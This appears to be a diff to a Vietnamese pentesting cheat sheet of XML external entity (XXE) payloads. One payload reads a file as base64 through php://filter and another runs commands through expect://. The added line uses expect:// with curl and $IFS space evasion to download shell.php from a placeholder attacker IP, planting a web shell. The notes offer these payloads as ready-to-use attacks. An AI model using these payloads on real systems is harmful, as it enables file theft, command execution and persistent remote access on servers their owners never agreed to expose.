@@ -63,3 +63,5 @@ tr -d ' -' -> Xóa toàn bộ dấu cách và dấu -
 Mã hóa nội dung và lấy nội dung xxe: <!ENTITY company SYSTEM "php://filter/read=convert.base64-encode/resource=abc">
 
 Thực thi lệnh hệ thống xxe : expect://id
+Web shell xxe :  /<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
